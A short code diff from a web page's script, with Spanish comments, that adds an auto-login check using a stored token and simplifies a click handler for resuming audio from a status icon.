+// Auto-login si hay token guardado
+if (TOKEN && USUARIO) {
+    mostrarDashboard();
+}
 
-/* 🔥 SONIDO: campana para activar audio con clic */
-(function setupAudioBell() {
-    const bell = document.getElementById('audioStatus');
-    if (bell) {
-        bell.addEventListener('click', function() {
-            asegurarAudioActivo();
-            setTimeout(function() {
-                reproducirSonido('nueva');
-                actualizarAudioStatus();
-            }, 120);
-        });
-    }
-    actualizarAudioStatus();
-})();
+// Reanudar audio al hacer clic en el icono
+document.getElementById('audioStatus').addEventListener('click', () => {
+    asegurarAudioActivo();
+});
 </script>
-
 </body>
 </html>
